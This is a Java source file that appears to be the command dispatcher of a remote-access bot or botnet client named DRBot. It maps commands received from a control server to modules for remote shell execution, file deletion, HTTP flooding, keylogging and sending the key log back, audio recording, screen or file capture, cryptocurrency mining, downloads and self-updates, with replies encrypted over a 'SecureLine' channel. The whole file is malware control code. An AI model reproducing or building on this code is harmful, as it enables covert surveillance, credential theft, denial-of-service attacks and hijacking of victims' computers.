package com.DRBot.Commands;

import com.DRBot.Commands.keyLogger.checkLib.checkLib;
import com.DRBot.SecureLine.SecureLine;
import java.util.List;
import java.util.ArrayList;
import java.util.Arrays;
import java.io.PrintWriter;
import java.io.IOException;
import java.net.Inet4Address;
import java.util.concurrent.Executors;
import java.util.concurrent.ExecutorService;

public class myCommands {
    private final String[] myCommands = {
    "capture", //done but open terminal on ftp
    "cmd",//done   1
    "delete",//done
    "die",
    "dns",
    "driveinf",//done  5
    "execute",
    "get",//done
    "httpflood",//done
    "stopwebserv",
    "netinf",//done 10
    "zip", //done 11
    "bmine", //done 12
    "ps",//done 13
    "keylog",//done 14
    "msg",//done     15
    "getL",  //done   16
    "down",//done   17
    "killBot",//done    18
    "open",//done   19
    "version",//done  20
    "exit",//done 21
    "who",//done 22
    "update",//done 23
    "rec",//done 24
    "pcinf", //done 25
    "exc"};//done 26
   
    private List<String> myCommandList;
    private ExecutorService exeSer;
    private Thread getThread,captureThread;
    private keylog keylog = null;
    private PrintWriter writer;
    private SecureLine secureLine;
    
    public int isCommand(String command){
        myCommandList = new ArrayList<>();
        myCommandList.addAll(Arrays.asList(myCommands));
        return myCommandList.indexOf(command);
        
    }
    public void analyzeCommand(final Inet4Address inetServer,int indexComm,final String[] command,final PrintWriter writer,final String botName,final SecureLine secureLine)throws NullPointerException
    ,IOException, InterruptedException{
        exeSer = Executors.newCachedThreadPool();
        this.writer = writer;
        this.secureLine = secureLine;
        switch(indexComm){
            case 0: //done Enc
                captureThread = new Thread(new capture(command,writer,inetServer,botName,secureLine));
                exeSer.execute(captureThread);
                break;
            case 1: //done Enc
                cmd cmd = new cmd(command,writer,secureLine);
                exeSer.execute(cmd);
                break;
            case 2: //done Enc
                delete delete = new delete(command,writer,secureLine);
                exeSer.execute(delete);
                break;
            case 3:
                break;
            case 4:
                break;
            case 5: //done Enc
                Thread driveinf = new Thread(new driveinf(command,writer,secureLine));
                exeSer.execute(driveinf);
                break;
            case 6:
                break;
            case 7: //done Enc
                getThread = new Thread(new get(command,inetServer,writer,botName,secureLine));
                exeSer.execute(getThread);
                break;
            case 8:            // done Enc        
                        httpflood h1 = new httpflood(command,writer,secureLine);
                        httpflood h2 = new httpflood(command,writer,secureLine);
                        ExecutorService ser = Executors.newCachedThreadPool();
                        ser.execute(h1);
                        ser.execute(h2);
                        ser.shutdown();
                break;
            case 9:
                break;
            case 10: //done Enc
                netinf netinf = new netinf(command,writer,secureLine);
                exeSer.execute(netinf);
                break;
            case 11: //done Enc
                zip zip = new zip(command,writer,secureLine);
                exeSer.execute(zip);
                break;
            case 12: //done Enc
                bmine bmine = new bmine(command,writer,secureLine);
                exeSer.execute(bmine);
                break;
            case 13: //done Enc
                Thread ps = new Thread(new ps(command,writer,secureLine));
                ps.start();
                break;
            case 14: //done Enc
                checkLib checkLib = new checkLib();
                if(checkLib.checkFiles() == true){
                if(keylog==null){
                    keylog = new keylog(command,writer,secureLine);
                }
                else{
                    toPrint("[KeyLogger] Already active.");
                    }
                }
                else{
                    toPrint("[KeyLogger] Main Lib not found, I need to download them.");
                }
                break;
            case 15: //done no Need Enc
                robotMsg robotMsg = new robotMsg(command);
                exeSer.execute(robotMsg);
                break;
            case 16: //done Enc
                if(new getLogger().checkLogger()){
                Thread getLogger = new Thread(new getLogger(command,writer,inetServer,botName,secureLine));
                exeSer.execute(getLogger);
                }
                else{
                    toPrint("[KeyLogger Log] doesn't exist.");
                }
                break;
            case 17://done Enc
                Thread down = new Thread(new down(command,writer,secureLine));
                exeSer.execute(down);
                break;
            case 18://done Enc
                killBot killBot = new killBot(writer,secureLine);
                exeSer.execute(killBot);
                break;
            case 19://done Enc
                open open = new open(command,writer,secureLine);
                exeSer.execute(open);
                break;
            case 20://done No need Enc
                toPrint(ver.getVersion());
                break;
            case 21://done NO need Enc
                toPrint("[Terminate] See Ya in the next bootup ..... Terminated.");
                System.exit(0);
                break;
            case 22://done Enc
                who who = new who(writer,secureLine);
                exeSer.execute(who);
                break;
            case 23://done Enc
                update update = new update(command,writer,secureLine);
                exeSer.execute(update);
                break;
            case 24://done Enc
                Thread record = new Thread(new Runnable(){
                    @Override
                    public void run(){
                        new recAudio(command,writer,inetServer,botName,secureLine);
                    }
                });
                exeSer.execute(record);
                break;
            case 25:
                pcinf pcinf = new pcinf(writer,secureLine);
                exeSer.execute(pcinf);
                break;
            case 26:
                Exc Exc = new Exc(command,writer,secureLine);
                exeSer.execute(Exc);
                break;
            default:
                break;
        }
    }
    private void toPrint(String toPrint){
        this.writer.println(secureLine.encrypt(toPrint));
        this.writer.flush();
    }
}
